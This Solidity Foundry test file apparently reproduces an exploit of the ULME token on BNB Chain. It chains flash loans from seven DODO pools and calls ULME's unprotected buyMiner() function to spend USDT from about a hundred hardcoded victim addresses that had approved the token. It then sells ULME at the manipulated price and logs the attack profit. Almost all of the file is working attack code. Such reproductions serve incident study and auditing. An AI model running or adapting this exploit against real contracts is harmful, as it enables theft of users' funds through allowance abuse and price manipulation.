pragma solidity ^0.8.10;
import "forge-std/Test.sol";
import "./interfaces/Cheatcodes.sol";
import "./interfaces/IERC20.sol";
import "./interfaces/IPancakeRouter02.sol";

interface IDODO {
    function flashLoan(
        uint256 baseAmount,
        uint256 quoteAmount,
        address assetTo,
        bytes calldata data
    ) external;
    
    function _BASE_TOKEN_() external view returns (address);
}

interface IULME {
    function buyMiner(address user,uint256 usdt) external;  
}

contract Exploit {
    address public USDT = 0x55d398326f99059fF775485246999027B3197955;
    address public ULME = 0xAE975a25646E6eB859615d0A147B909c13D31FEd;
    address public Router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address[] public victims =[0x4A005e5E40Ce2B827C873cA37af77e6873e37203, 0x5eCe8A3382FD5317EBa6670cAe2F70ccA8845859, 0x065D5Bfb0bdeAdA1637974F76AcF54428D61c45d, 0x0C678244aaEd33b6c963C2D6B14950d35EAB899F, 0x1F0D9584bC8729Ec139ED5Befe0c8677994FcB35, 0x6b8cdC12e9E2F5b3620FfB12c04C5e7b0990aaf2, 0xA9882080e01F8FD11fa85F05f7c7733D1C9837DF, 0x1dFBBECc9304f73caD14C3785f25C1d1924ACB0B, 0x0b038F3e5454aa745Ff029706656Fed638d5F73a, 0x0Bd084decfb04237E489cAD4c8A559FC5ce44f90, 0x5EB2e4907f796C9879181041fF633F33f8858d93, 0x0DE272Ef3273d49Eb608296A783dBd36488d3989, 0xAe800360ac329ceA761AFDa2d3D55Bd12932Ab62, 0xf7726cA96bF1Cee9c6dC568ad3A801E637d10076, 0x847aA967534C31b47d46A2eEf5832313E36b25E2, 0x6c91DA0Dc1e8ab02Ab1aB8871c5aE312ef04273b, 0xb14018024600eE3c747Be98845c8536994D40A5D, 0x8EcdD8859aA286c6bae1f570eb0105457fD24cd2, 0x6ff1c499C13548ee5C9B1EA6d366A5E11EcA60ca, 0xC02eb88068A40aEe6E4649bDc940e0f792e16C22, 0xa2D5b4de4cb10043D190aae23D1eFC02E31F1Cb6, 0x5E05B8aC4494476Dd539e0F4E1302806ec52ED6F, 0xDeb6FDCa49e54c8b0704C5B3f941ED6319139816, 0x0E6533B8d6937cC8b4c9be31c00acBfaCB6760a5, 0xCE0Fd72a7cF07EB9B20562bbb142Cb711A42867f, 0x4868725bf6D395148def99E6C43074C774e7AC1D, 0x2F1f2BAF34703d16BcfD62cF64A7A5a44Ad6c9d4, 0x3d49Bdf065f009621A02c5Fd88f72ed0A3910521, 0x6E31C08f1938BE5DF98F8968747bB34802D76E50, 0x4F741D8DCDEdd74DadeA6cd3A7e41ECb28076209, 0x5480c14b9841C89527F0D1A55dDC0D273Aae3609, 0xb3725dA113eFFd7F39BE62A5E349f26e82a949fF, 0x9d83Dee089a5fBfB5F2F1268EDB80aeA8Ba5aF16, 0x0c02F3d6962245E934A3fe415EAbA6bf570c1883, 0x0182cfEFB268DD510ee77F32527578BEAC6238e2, 0x78598Ac3943454682477852E846532F73d5cFE5F, 0xd067c7585425e1e5AA98743BdA5fB65212751476, 0x3507ddF8b74dAEd03fE76EE74B7d6544F3B254B7, 0xEca4Fd6b05E5849aAf5F2bEE5Eb3B50f8C4f4E3c, 0xAA279af072080f3e453A916b77862b4ff6eB245E, 0x4e505a21325A6820E2099Bbd15f6832c6f696a3c, 0xA5b63F7b40A5Cc5ee6B9dB7cef2415699627Ee89, 0x3dd624cEd432DDc32fA0afDaE855b76aa1431644, 0x17f217Fdeff7Ee4a81a4b2f42c695EDC20806957, 0x41819F36878d15A776225928CD52DC56acCFD553, 0x61ca76703C5aF052c9b0aCc2Bab0276875DDd328, 0x2956bCc87450B424C7305C4c6CF771196c23A52E, 0x03be05224803c89f3b8C806d887fD84A20D16e5C, 0x3C97320bf030C2c120FdCe19023A571f3fbB6184, 0xc52021150ca5c32253220bE328ddC05F86d3a619, 0x6d7aAa35c4B2dBD6F1E979e04884AeE1B4FBB407, 0x7c80162197607312EC99d7c9e34720B3572d6D16, 0x15D92C909826017Ff0184eea3e38c36489517A7C, 0xC07fa7a1F14A374d169Dc593261843B4A6d9C1C3, 0x4b415F48FA70a9a0050F6380e843790260973808, 0x9CeEeB927b85d4bD3b4e282c17EB186bCDC4Dd15, 0x0eb76DAf60bdF637FC207BFb545B546D5Ee208B1, 0x96D7F1660e708eDdF2b6f655ADB61686B59bC190, 0xDCeB637E38dBae685222eEf6635095AaaEC65496, 0x36083Aac533353317C24Bd53227DbF29Ed9F384c, 0x94913f31fBaFcb0ae6e5EfA4C18E3ee301097eab, 0x188c50F43f9fA0026BAaa7d8cF83c358311f0500, 0x3d8dcC70777643612564D84176f769A1417987a5, 0x00273CEEe956543c801429A886cD0E1a79f5d8cA, 0xC43C5F785D06b582E3E710Dc0156267Fd135C602, 0x0406aefd83f20700D31a49F3d6fdbF52e8F7D0Ef, 0xBeD8C7433dE90D349f96C6AE82d4eb4482AA6Bf7, 0xDe436F7742cE08f843f8d84e7998E0B7e4b73101, 0xd38c6E26aa4888DE59C2EAaD6138B0b66ABBF21D, 0xc0dFb3219F0C72E902544a080ba0086da53F9599, 0xFAAD61bd6b509145c2988B03529fF21F3C9970B2, 0x9f9BEEF87Cfe141868E21EacbDDB48DF6c54C2F2, 0x6614e2e86b4646793714B1fa535fc5875bB446d5, 0x7eFe3780b1b0cde8F300443fbb4C12a73904a948, 0xAd813b95A27233E7Abd92C62bBa87f59Ca8F9339, 0x13F33854cE08e07D20F5C0B16884267dde21a501, 0x59ebcde7Ec542b5198095917987755727725fD1d, 0xe5A5B86119BD9fd4DF5478AbE1d3D9F46BF3Ba5F, 0xC2724ed2B629290787Eb4A91f00aAFE58F262025, 0xDFa225eB03F9cc2514361A044EDDA777eA51b9ad, 0x85d981E3CDdb402F9Ae96948900971102Ee5d6b5, 0xb0Ac3A88bFc919cA189f7d4AbA8e2F191b37A65B, 0x1A906A9A385132D6B1a62Bb8547fD20c38dd79Bb, 0x9d36C7c400e033aeAc391b24F47339d7CB7bc033, 0x5B19C1F57b227C67Bef1e77b1B6796eF22aEe21B, 0xbfd0785a924c3547544C95913dAC0b119865DF9e, 0xF003E6430fbC1194ffA3419629A389B7C113F083, 0xfa30Cd705eE0908e2Dac4C19575F824DED99818E, 0xe27027B827FE2FBcFCb56269d4463881AA6B8955, 0xEddD7179E461F42149104DCb87F3b5b657a05399, 0x980FcDB646c674FF9B6621902aCB8a4012974093, 0x2eBc77934935980357A894577c2CC7107574f971, 0x798435DE8fA75993bFC9aD84465d7F812507b604, 0x1Be117F424e9e6f845F7b07C072c1d67F114f885, 0x434e921bDFe74605BD2AAbC2f6389dDBA2d37ACA, 0xaFacAc64426D1cE0512363338066cc8cABB3AEa2, 0x2693e0A37Ea6e669aB43dF6ee68b453F6D6F3EBD, 0x77Aee2AAc9881F4A4C347eb94dEd088aD49C574D, 0x951f4785A2A61fe8934393e0ff6513D6946D8d97, 0x2051cE514801167545E74b5DD2a8cF5034c6b17b, 0xC2EE820756d4074d887d762Fd8F70c4Fc47Ab47f];
    address[] public dodoFlashLoanPool =[0x910d4354d34E0F1EF31d22a687BE191A1aE0cA5F,0xDa26Dd3c1B917Fbf733226e9e71189ABb4919E3f,0xFeAFe253802b77456B4627F8c2306a9CeBb5d681,0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476,0xD7B7218D778338Ea05f5Ecce82f86D365E25dBCE,0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A,0x26d0c625e5F5D6de034495fbDe1F6e9377185618];
    uint256 public poolCount;
    mapping(address => uint256) public loanFromThePoolAmout;

    function Start() public{        
        console.log("FlashLoan from 7 DODO pools >>>");
        _callflashloan();
    }
    
    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        _flashLoanCallBack(sender,baseAmount,quoteAmount,data);
    }

    function DVMFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount,bytes calldata data) external {
        _flashLoanCallBack(sender,baseAmount,quoteAmount,data);
    }

    function _flashLoanCallBack(address sender, uint256, uint256, bytes calldata data) internal {
        poolCount++;
        if (poolCount < dodoFlashLoanPool.length) {
            _callflashloan();
        }
        else {
            _startAttack();
            console.log("Return the Flashloan >>>");
            _payBack();
        }   
    }
    
    function _callflashloan() internal {
        console.log("============== flashloan",poolCount + 1, " ==============\n");

        uint256 loanAmount = IERC20(USDT).balanceOf(dodoFlashLoanPool[poolCount]);
        console.log("loan amount:", loanAmount / 1e18,"\n");

        loanFromThePoolAmout[dodoFlashLoanPool[poolCount]] = loanAmount;
        bytes memory data = abi.encode(dodoFlashLoanPool[poolCount], USDT, loanAmount);
        address flashLoanBase = IDODO(dodoFlashLoanPool[poolCount])._BASE_TOKEN_();
        
        if(flashLoanBase == USDT) {
            IDODO(dodoFlashLoanPool[poolCount]).flashLoan(loanAmount, 0, address(this), data);
        
        } else {
            IDODO(dodoFlashLoanPool[poolCount]).flashLoan(0, loanAmount, address(this), data);
        }
    }
    
    function _payBack() internal {
        for (uint256 i=0; i< dodoFlashLoanPool.length; i++) {
            IERC20(USDT).transfer(dodoFlashLoanPool[i], loanFromThePoolAmout[dodoFlashLoanPool[i]]);
        }
    }
    
    function _startAttack() internal {
         console.log("Approve ULME and USDT >>> \n");
        IERC20(ULME).approve(Router, type(uint256).max);
        IERC20(USDT).approve(Router, type(uint256).max);
        
        address[] memory buyPath = new address[](2);
        buyPath[0] = USDT;
        buyPath[1] = ULME;

        address[] memory sellPath = new address[](2);
        sellPath[0] = ULME;
        sellPath[1] = USDT;
       
       console.log("Buy ULME Token >>> \n");
        IPancakeRouter02(Router).swapExactTokensForTokensSupportingFeeOnTransferTokens (
            1000000e18,
            0,
            buyPath,
            address(this),
            block.timestamp
        );

        console.log("Call the buyMiner() function of ULME token based on pre-discovered users who approved USDT tokens >>>\n");
        for(uint256 i = 0; i < victims.length; i++) {
            uint256 allowanceAmount = IERC20(USDT).allowance(victims[i], ULME);
            uint256 victimBalance = IERC20(USDT).balanceOf(victims[i]);
            if (allowanceAmount > victimBalance && victimBalance > 12e18){
                uint256 fee = victimBalance / 10;
                IULME(ULME).buyMiner(victims[i], victimBalance - fee - 1);
            }
        }

        console.log("Swap ULME for USDT with an indirectly manipulated price >>> \n");
        IPancakeRouter02(Router).swapExactTokensForTokensSupportingFeeOnTransferTokens (
            IERC20(ULME).balanceOf(address(this)) - 1,
            0,
            sellPath,
            address(this),
            block.timestamp
        );        
    }
}

contract test is DSTest{
    Exploit internal exploit;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    
    function setUp() public {
        cheats.createSelectFork("bsc", 22476695);
    }

    function testExploit() public {
        exploit = new Exploit();
        exploit.Start();
        verify();
    }
    function verify() public {
        console.log("============== Attack profit: ~", IERC20(0x55d398326f99059fF775485246999027B3197955).balanceOf(address(exploit)) / 1e18 ,"USDT", "==============");
        console.log("There is a small difference between the attack profit and the original attack profit.");
    }
}